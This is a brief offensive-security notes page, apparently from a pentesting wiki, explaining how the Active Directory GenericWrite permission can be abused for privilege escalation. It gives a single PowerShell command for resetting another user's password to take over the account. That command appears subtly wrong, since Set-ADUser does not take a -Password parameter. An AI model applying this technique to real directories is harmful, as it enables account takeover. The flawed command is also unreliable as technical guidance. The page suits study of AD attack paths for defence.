# GenericWrite

The **GenericWrite** permission allows a user to modify most attributes of an Active Directory object, including user accounts, groups, and computers. It give attackers broad access to modify key attributes that can lead to privilege escalation or lateral movement.

Can be exploited to change a users password and log in as that user.

Reset password

{% code overflow="wrap" %}
```powershell
Set-ADUser -Identity <Username> -PasswordNeverExpires $false -Password (ConvertTo-SecureString "NewP@ssw0rd" -AsPlainText -Force)
```
{% endcode %}



